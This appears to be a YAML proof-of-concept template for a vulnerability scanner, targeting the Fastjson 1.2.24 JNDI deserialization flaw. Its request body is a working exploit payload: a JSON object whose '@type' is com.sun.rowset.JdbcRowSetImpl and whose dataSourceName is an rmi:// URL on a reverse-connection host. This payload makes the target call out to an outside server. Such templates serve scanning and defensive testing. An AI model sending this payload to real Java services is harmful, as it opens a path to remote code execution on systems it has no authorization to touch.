name: poc-yaml-fastjson-1.2.24-jndi
set:
  reverse: newReverse()
  reverseURL: reverse.domain

rules:
  echo:
    request:
      method: POST
      path: /
      headers:
        Content-Type: application/json
      body: |
        {
            "b":{
            "@type": "com.sun.rowset.JdbcRowSetImpl",
            "dataSourceName": "rmi://{{reverseURL}}/TouchFile",
            "autoCommit": true
            }
        }
    expression: reverse.wait(5)
expression: echo()
